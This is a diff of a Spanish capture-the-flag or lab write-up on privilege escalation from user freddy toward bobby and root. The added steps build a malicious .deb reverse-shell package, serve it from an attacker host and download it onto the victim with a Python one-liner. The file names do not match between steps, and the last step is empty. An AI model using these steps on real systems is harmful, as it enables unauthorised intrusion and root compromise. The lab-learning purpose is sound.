@@ -587,14 +587,42 @@ User freddy may run the following commands on a08bdd2ca115:
   ```
 
   **Ahora en nuestra máquina tenemos una terminal de freddy corriendo, lo que nos facilitará la escalada de privilegios**
+  
+  **Obtuvimos**:
+  
+  ```sh
+  freddy@c84a657f3a83:~$ 
+  ```
 
 ## 9. Intentamos escalar privilegios desde freddy hacia bobby y desde bobby hacia root.
 
 1. Creamos un paquete malicioso que se ejecutará en el cliente:
 
-2. ```bash
-   python3 -c "import urllib.request; urllib.request.urlretrieve('http://172.17.0.1:8080/revshell2.deb', '/tmp/revshell.deb')"
+2. Empaquetar los archivos:
+
+   ```sh
+   dpkg-deb --build package-root revshell2.deb
    ```
+
+3. Descargamos el paquete que creamos en el servidor de la víctima
+
+   ```sh
+   python3 -c "import urllib.request; urllib.request.urlretrieve('http://172.17.0.1:8080/revshell.deb', '/tmp/revshell.deb')"
+   ```
+
+4. Validamos que el archivo se haya descargado
+
+   ```sh
+   ls -lh /tmp/revshell2.deb
+   ```
+
+5. Lanzar servidor desde el host para enviar el paquete revshell.deb
+
+   ```sh
+   python3 -m http.server 8080
+   ```
+
+6. 
 
    
 
